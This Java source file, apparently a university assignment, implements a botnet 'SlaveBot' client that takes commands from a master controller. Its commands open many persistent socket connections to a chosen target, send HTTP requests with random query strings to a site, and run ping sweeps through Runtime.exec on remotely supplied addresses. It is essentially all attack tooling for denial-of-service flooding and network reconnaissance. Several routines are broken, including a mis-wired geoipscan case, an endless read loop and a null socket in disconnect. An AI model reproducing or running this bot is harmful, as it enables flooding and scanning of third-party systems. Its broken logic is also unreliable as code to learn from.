/*
 * Author: Brandon Lee Gaerlan
 * Program: Create a program that connects a SlaveBot to a MasterBot
 * The master must have the following specified commands as noted in the Programming Project requirements
 * Due Date: 03-06-2017
 * */

package slavebot;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class SlaveBot {
	
	private static ArrayList<Socket> sockets = new ArrayList<>();
	private static ArrayList<Socket> socketPorts = new ArrayList<>();
	private static ArrayList<String> ipAdds = new ArrayList<>();
	
	public static void main(String [] args) {
        
		String ipAddress = "";
		int portNum = 0;
		
		// Check commands
		if(args.length != 4) {
			
			System.out.println("Terminating.  Not enough arguments");
			System.exit(0);
			
		} else if( args.length == 4) {
			
			// Checks to see if proper parameters have been set
			if( args[0].equals("-h") ) {
				
				// Set the IP address and Port number
				ipAddress = args[1];
				portNum = Integer.parseInt(args[3]);
				
				System.out.println("Initiating Slave Bot");
				
				try {
					// Check to see if it's a valid IP Address
					if( checkIP(args[1]) ) {
						
						byte[] bytes = convertToIP(ipAddress);
						Socket slaveBot = new Socket(InetAddress.getByAddress(bytes), portNum);
						System.out.println("Slave Bot connected to: "							
							+  slaveBot.getRemoteSocketAddress());
						
						// Initializing chat
						initCmdLine(slaveBot);
						
						// Closes the slaveBot
						slaveBot.close();						
					} 
					
					// Check to see if it's a valid IP Address
					else {
						Socket slaveBot = new Socket(InetAddress.getByName(ipAddress), portNum);
						System.out.println("Slave Bot connected to: "							
								+  slaveBot.getRemoteSocketAddress());
						
						// Initializing chat
						initCmdLine(slaveBot);
						
						// Closes the slaveBot						
						slaveBot.close();
					}
				} catch(Exception e) {
					e.printStackTrace();
				}
			} else {
				System.out.println("Please enter the proper parameters in this format:"
					+ "\n"
					+ "-h localhost -p 9999");
			} 
		}
		
	} // End of Main Program	
	
	// Initializing chat
	public static void initCmdLine(Socket client) {
		PrintWriter output;
		BufferedReader input;
		
		try {
			output	= new PrintWriter(client.getOutputStream(), true);
	        input	= new BufferedReader(new InputStreamReader(client.getInputStream()));
			
			String cmdArgs[];

			while(true) {
				String cmdPrmpt = input.readLine();
				cmdArgs = cmdPrmpt.split(" ");				
				
				System.out.println(">" + cmdPrmpt);
				
				if(cmdArgs[0].toLowerCase().equals("exit")) {
					System.out.println("Closing Connections");
    				output.close();
    				input.close();
    				break;    				
    			}
				
				// Switch statements that are activated once args are passed through from the masterbot
				switch(cmdArgs[0].toLowerCase()) {					
					case "connect":
						connect(cmdArgs);
						break;
					case "disconnect":
						disconnect(cmdArgs);
						break;
					case "ipscan":
						final String commandPrompt[] = cmdArgs;
						Thread ipScan = new Thread(new Runnable() {
							@Override
							public void run() {
								ipScan(commandPrompt, output, input);
							}
						});
						ipScan.start();
						ipScan.sleep(1000);
						break;
					case "tcpscan":
						final String commandPrompts[] = cmdArgs;
						Thread tcpScan = new Thread(new Runnable() {
							@Override
							public void run() {
								tcpScan(commandPrompts, output, input);
							}
						});
						tcpScan.start();
						tcpScan.sleep(1000);
						break;
					case "geoipscan":
						final String geoCmdArgs[] = cmdArgs;
						Thread geoIPScan = new Thread(new Runnable() {
							@Override
							public void run() {
								tcpScan(geoCmdArgs, output, input);
							}
						});
						geoIPScan.start();
						geoIPScan.sleep(1000);
						break;
					default:
						System.out.println(">Invalid argument.  Try again");
						continue;					
				}
				
			} // End of while loop
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	private static void tcpScan(String[] cmdArgs, PrintWriter output, BufferedReader input) {
		try {
			if(cmdArgs.length == 4 ) {
				String ipAddressRange[] = cmdArgs[3].split("-");
				StringBuilder st = new StringBuilder();
				int length,
					startPort,
					endPort;
						
				startPort	= Integer.parseInt(ipAddressRange[0]);
				endPort		= Integer.parseInt(ipAddressRange[1]);
				length		= endPort - startPort;
				
				if(checkIP(cmdArgs[2])) {
					String toCompare = "/" + cmdArgs[2];
					
					output.println("Target IP: " + cmdArgs[2] + "\n");
					System.out.println("Target IP: " + cmdArgs[2] + ":");
					
					for(Socket socket : sockets) {
						if(socket.getRemoteSocketAddress().toString().contains(toCompare)) {
							for(; startPort < endPort; startPort++) {
								if(socket.getPort() == startPort) {
									socketPorts.add(socket);
									st.append(Integer.toString(startPort) + ", ");
								}									
							}
						}
					}
				} else {
					output.println("Target IP: " + cmdArgs[2] + "\n");
					System.out.println("Target IP: " + cmdArgs[2] + ":");
					
					for(Socket socket : sockets) {
						if(socket.getRemoteSocketAddress().toString().contains(cmdArgs[2])) {
							for(; startPort < endPort; startPort++) {
								if(socket.getPort() == startPort) {
									socketPorts.add(socket);
									st.append(Integer.toString(startPort) + ", ");
								}	
							}
						}
					}
				}
				
				String ipPorts = st.toString();
				String listOfPorts[] = ipPorts.split(", ");
				int countPorts = 0; 
				
				for(String port : listOfPorts) {
					countPorts++;
					if(countPorts % 5 == 0) 
						System.out.println("\n");
					System.out.print(port + ", ");
				}
				output.println(ipPorts);
				output.flush();
				
			} else {
				output.println("Invalid command");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	private static void ipScan(String[] cmdArgs, PrintWriter output, BufferedReader input) {
		try {
			if(cmdArgs.length == 3 ) {
				String ipAddressRange[] = cmdArgs[2].split("-"); 
				int length, first, second;
						
				first	= subIPAddresses(ipAddressRange[0]);
				second	= subIPAddresses(ipAddressRange[1]);
				length = second - first;
				
				Process toPing;
				int count		= 0;
				String firstIP	= ipAddressRange[0];
				String tempIP;
				StringBuilder st = new StringBuilder();
				
				System.out.println(System.getProperty("os.name"));
				
				while(count < length) {
					//System.out.println(incSubIP(firstIP));
					try {
						toPing = Runtime.getRuntime().exec("ping " + firstIP);
						
						BufferedReader inputStream = new BufferedReader(
							new InputStreamReader(toPing.getInputStream()));

				        String commandOutput = "";
				        boolean isReachable = true;
				        // reading output stream of the command
				        while ((commandOutput = inputStream.readLine()) != null) {
				            
				        	// if(commandOutput.contains("Destination host unreachable")) {
				            if(commandOutput.contains("unreachable")) {
				                isReachable = false;
				                break;
				            }       
				        }
				        
				        if(isReachable) {
				        	count++;
				        	
				        	if (count == length) {
				        		st.append(firstIP);
				        		ipAdds.add(firstIP);
				        		break;
				        	}
				        		
				        	st.append(firstIP + ", ");
				        }
				        /* else
				        	System.out.println("Host is not reachable!");*/
				    } catch (IOException e) {
						e.printStackTrace();
					}
					firstIP = incSubIP(firstIP);
				}
				
				String ips = st.toString();
				String listOfIps[] = ips.split(", ");
				int countIPs = 0; 
				
				for(String ip : listOfIps) {
					if(countIPs % 5 == 0) 
						System.out.println("\n");
					System.out.print(ip + ", ");
					countIPs++;
				}
				
				output.println(st.toString());
			} else {
				System.out.println("Invalid command");
				output.println("Invalid command");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	} // End of ipscan method
	
	private static void geoIPScan(String[] cmdArgs, PrintWriter output, BufferedReader input) {
		try {
			if(cmdArgs.length == 3 ) {
				String ipAddressRange[] = cmdArgs[2].split("-"); 
				int length, first, second;
						
				first	= subIPAddresses(ipAddressRange[0]);
				second	= subIPAddresses(ipAddressRange[1]);
				length = second - first;
				
				Process toPing;
				int count		= 0;
				String firstIP	= ipAddressRange[0];
				StringBuilder st = new StringBuilder();
				
				System.out.println(System.getProperty("os.name"));
				
				while(count < length) {

					try {
						toPing = Runtime.getRuntime().exec("ping " + firstIP);
						
						BufferedReader inputStream = new BufferedReader(
							new InputStreamReader(toPing.getInputStream()));

				        String commandOutput = "";
				        boolean isReachable = true;

				        // reading output stream of the command
				        while ((commandOutput = inputStream.readLine()) != null) {

				            if(commandOutput.contains("Destination host unreachable")) {
				                isReachable = false;
				                break;
				            }       
				        }
				        
				        if(isReachable) {
				        	count++;
				        	
				        	if (count == length) {
				        		st.append(firstIP);
				        		ipAdds.add(firstIP);
				        		break;
				        	}
				        		
				        	st.append(firstIP + ", ");
				        }
				    } catch (IOException e) {
						e.printStackTrace();
					}
					firstIP = incSubIP(firstIP);
				}
				
				String ips = st.toString();
				String listOfIps[] = ips.split(", ");
				int countIPs = 0; 
				
				for(String ip : listOfIps) {
					if(countIPs % 5 == 0) 
						System.out.println("\n");
					System.out.print(ip + ", ");
					countIPs++;
				}
				
				output.println(st.toString());
			} else {
				System.out.println("Invalid command");
				output.println("Invalid command");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	} // End of geoipscan method

	// Checks and validates IP address
	private static boolean checkIP(String ipAddr) {
		String[] num = ipAddr.split("\\.");
        
		if (num.length != 4)
            return false;
        
        for(String str: num) {
        	int i = Integer.parseInt(str);
            if( (i < 0) || (i > 255) ) 
            	return false;
        }
        
        return true;        
	} // End of checkIP method
	
	public static String incSubIP(String ipAddress) {
		String incremented = null;
		
		String nums[] = ipAddress.split("\\.");
		
		int plusIP = Integer.parseInt(nums[3]);
		plusIP++;
		
		incremented = nums[0] + "." + nums[1] + "." + nums[2] + "." + Integer.toString(plusIP);
		
		return incremented;
	}
	
	// Convert to IP Address Format
	private static byte[] convertToIP(String ipAddress) {
		
		//Holds the IP address once string has been converted
		byte ipAddr[] = new byte[4];
		
		String[] num = ipAddress.split("\\.");
        int count = 0;
		
        for(String str : num) {
        	int i = Integer.parseInt(str);
        	ipAddr[count] = (byte) i;
        	count++;
        }
		
		return ipAddr;		
	} // End of converToIP method
	
	// Sub IP Address
	private static int subIPAddresses(String ipAddress) {
			
		//Holds the IP address once string has been converted
		byte ipAddr[] = new byte[4];
		
		String[] num = ipAddress.split("\\.");
        int count	= 0;
        int subNet	= 0;
		
        for(String str : num) {
        	if (count == 3) {
        		subNet = Integer.parseInt(str);
        	}
        	
        	count++;
        }
		
		return subNet;		
	} // End of converToIP method

	private static void connect(String keywds[]) {
		try {
			Socket connectToTarget = null;
			
			String targetHost;
			int targetPortNum, numOfConnections = 0;

			// Parses and chooses which branch of commands to use based on arguments
			switch (keywds.length) {
				// Fin
				case 4:
					targetHost = keywds[2];
					targetPortNum = Integer.parseInt(keywds[3]);
					
					if(validateURL(targetHost)) {
						targetHost += genString();
						connectToSite(targetHost);
						return;
					}
					
					if (checkIP(targetHost)) {
						connectSocket(connectToTarget, targetHost, targetPortNum);						
					} else {
						connectSocket(connectToTarget, targetHost, targetPortNum);
					}	
					break;
				case 5:	
					targetHost = keywds[2];
					targetPortNum = Integer.parseInt(keywds[3]);
	
					if(keywds[4].equals("keepalive")) {
						if (checkIP(targetHost)) {	
							connectToTarget = new Socket(targetHost, targetPortNum);
							connectToTarget.setKeepAlive(true);
							System.out.println(connectToTarget.getKeepAlive());
							if (connectToTarget.isConnected()) {
								System.out.println(
									"Slave Bot is connected to: " + connectToTarget.getInetAddress().getHostAddress()
									+ "\t"
									+ connectToTarget.getInetAddress().getHostName().toString()
								);
								sockets.add(connectToTarget);
							}
						} else {	
							connectToTarget = new Socket(InetAddress.getByName(targetHost), targetPortNum);
							connectToTarget.setKeepAlive(true);
							if (connectToTarget.isConnected()) {
								System.out.println(
									"Slave Bot is connected to: " + connectToTarget.getInetAddress().getHostAddress()
									+ "\t"
									+ connectToTarget.getInetAddress().getHostName().toString()
								);
								sockets.add(connectToTarget);
							}
						}
					}
					
					// Read from URL
					else if(keywds[4].contains("url=")) {
						String path = genString();
						if (checkIP(targetHost)) {	
							connectToTarget = new Socket(targetHost, targetPortNum);
							connectToTarget.setKeepAlive(true);
							System.out.println(connectToTarget.getKeepAlive());
							if (connectToTarget.isConnected()) {
								sockets.add(connectToTarget);
								getHTTPRequest(connectToTarget, targetHost, path);
							}
						} else {	
							connectToTarget = new Socket(InetAddress.getByName(targetHost), targetPortNum);
							connectToTarget.setKeepAlive(true);
							if (connectToTarget.isConnected()) {
								sockets.add(connectToTarget);
								getHTTPRequest(connectToTarget, targetHost, path);
							}
						}
					} else {
						numOfConnections = Integer.parseInt(keywds[4]);
						if (checkIP(targetHost))
							createConnections(connectToTarget, targetHost, targetPortNum, numOfConnections);
						else
							createConnections(connectToTarget, targetHost, targetPortNum, numOfConnections);
					}
					break;
				case 6:
					targetHost = keywds[2];
					targetPortNum = Integer.parseInt(keywds[3]);
					numOfConnections = Integer.parseInt(keywds[4]);
					
					if (checkIP(targetHost)) {
						createConnections(connectToTarget, targetHost, targetPortNum, numOfConnections);
					}
						
					else {
						createConnections(connectToTarget, targetHost, targetPortNum, numOfConnections);
					}
					
					break;
				default:
					System.out.println("Invalid arguments.  Try again.");
					break;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	private static void disconnect(String keywds[]) {
		
		System.out.println("Start of disconnect");
		
		Socket connectToTarget = null;
		Socket toClose = null;
		String targetHost;
		int targetPortNum, numOfConnections;
		targetHost = keywds[2];
		
		try {
			for (Socket toIterate : sockets) {
				if (checkIP(targetHost)) {
					String toCompare = "/" + targetHost;
					
					if (toIterate.getInetAddress().toString().equals(toCompare)) {
						toClose = toIterate;
						break;
					}
				} else {
					if (toIterate.getInetAddress().getHostName().toString().equals(targetHost)) {
						toClose = toIterate;
						break;
					}
				}
			}
			
			System.out.println("For loop executed");
			
			if (toClose == null) {
				System.out.println("There are no connections");
				return;
			}	
			
			// Parses and chooses which branch of commands to use
			switch(keywds.length) {
				case 3:
					if(checkIP(targetHost)) {
						if(toClose.getInetAddress().toString().equals(targetHost))
							closeSocket(toClose);
					} else {
						if(toClose.getInetAddress().getHostName().toString().equals(targetHost))
							closeSocket(toClose);
					}
					break;
				case 4:
					targetPortNum = Integer.parseInt(keywds[3]);
					if(toClose.getInetAddress().toString().equals(targetHost) && (connectToTarget.getPort() == targetPortNum)) {
						toClose.close();
					}						
					break;
				default:
					System.out.println("Invalid arguments.  Try again.");
					break;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}		
	}
	
	private static void createConnections(Socket client, String targetHost, int targetPortNum, int numOfConnections) {
		int totalConnections = targetPortNum + numOfConnections;
		
		for(; targetPortNum < totalConnections; targetPortNum++) {
			try {
				if (checkIP(targetHost)) 
					connectSocket(client, targetHost, targetPortNum);
				else
					connectSocket(client, InetAddress.getByName(targetHost), targetPortNum);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	private static String genString() {
		
		String alphaNum = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.append("/#q=");
		
		Random rndNum	 = new Random();
		Random rndString = new Random();
		
		int numOfChars = rndNum.nextInt(10);
		int totalLength = numOfChars + stringBuilder.length() + 1;		
		
		while (stringBuilder.length() < totalLength) {
			int index = (int) (rndString.nextFloat() * alphaNum.length() );
			stringBuilder.append(alphaNum.charAt(index));
		}
		
		String appendToURL = stringBuilder.toString();
		return appendToURL;
	}
	
	private static boolean validateURL(String url) {
		
		String urlToVerify = "^((https?|ftp)://|(www)\\.)?[a-z0-9-]+(\\.[a-z0-9-]+)+([/?].*)?$";

		Pattern p = Pattern.compile(urlToVerify);
		Matcher m = p.matcher(url);
		if(m.find()) 
			return true;
		return false;
	}
	
	// Method to use in the future
	private static void establishConnection(Socket client, String targetHost, int targetPortNum) {
		try {
			client = new Socket(InetAddress.getByName(targetHost), targetPortNum);
			if (client.isConnected()) {
				System.out.println(
					"Slave Bot is connected to: " + client.getInetAddress().getHostAddress()
					+ "\t"
					+ client.getInetAddress().getHostName().toString()
				);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}		
	}
		
	private static void connectToSite(String url) {
		try {
			
			URL newUrl = new URL(url);
			HttpURLConnection con = (HttpURLConnection) newUrl.openConnection();

			// optional default is GET
			con.setRequestMethod("GET");

			//add request header
			con.setRequestProperty("User-Agent", "Mozilla/5.0");

			int responseCode = con.getResponseCode();
			System.out.println("\nHTTP Response: " + responseCode);
			
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	
	// Close a socket connection from a single target
	private static void closeSocket(Socket toClose) {
		try {
			toClose.close();
			System.out.println("Connection " + toClose.getInetAddress().toString()
				+ " closed");
		} catch (IOException e) {
			e.printStackTrace();
		}		
	}
	
	// Connect Socket to a single target
	private static void connectSocket(Socket connectToTarget, String targetHost, int targetPortNum) {
		try {
			connectToTarget = new Socket(targetHost, targetPortNum);
			
			if (connectToTarget.isConnected()) {
				System.out.println(
					"Connected to: " + connectToTarget.getInetAddress().getHostAddress()
					+ "\t"
					+ connectToTarget.getInetAddress().getHostName().toString() );
				
				sockets.add(connectToTarget);
			}
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}		
	} // End of connectSocket method
	
	// Connect Socket to a single target via hostname
	private static void connectSocket(Socket connectToTarget, InetAddress byName, int targetPortNum) {
		try {
			connectToTarget = new Socket(byName, targetPortNum);
			
			if (connectToTarget.isConnected()) {
				System.out.println(
					"Connected to: " + connectToTarget.getInetAddress().getHostAddress()
					+ "\t"
					+ connectToTarget.getInetAddress().getHostName().toString() );
				
				sockets.add(connectToTarget);
			}
		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}		
	}
	
	
	private static void getHTTPRequest(Socket socket, String webSite, String path) {
		PrintWriter output;
		BufferedReader input;
		
		try {
			output	= new PrintWriter(socket.getOutputStream(), true);
	        input	= new BufferedReader(new InputStreamReader(socket.getInputStream()));
			
			output.println("GET " + path + " HTTP/1.1");
			output.println("Host: " + webSite + "\n");
			
			String read = input.readLine();
			/*String read = input.readLine();
			System.out.println(read);*/
			while(read != null) {
				System.out.println(read);
			}
			
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	
}